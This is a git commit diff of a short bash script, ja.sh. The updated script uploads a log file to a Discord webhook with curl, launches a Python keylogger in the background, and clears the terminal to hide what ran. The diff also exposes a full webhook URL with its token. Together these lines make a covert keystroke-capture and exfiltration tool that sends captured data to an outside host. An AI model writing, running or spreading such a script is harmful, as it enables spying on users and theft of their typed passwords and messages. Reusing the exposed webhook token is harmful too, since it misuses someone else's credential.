b6c9961f21d5d18b6f71be0904af165a2dbb6e9a
Dada <david.kondziella@rub.de>
2023-12-07 02:52:01 +0100

    Update ja.sh

--- ja.sh
+++ ja.sh
@@ -1,2 +1,4 @@
 #!/bin/bash 
-curl -F "file1=@name.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
+curl -F "filename=@/home/dada/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
+python3 /home/dada/Keylogger/linux/keylogger.py &
+clear
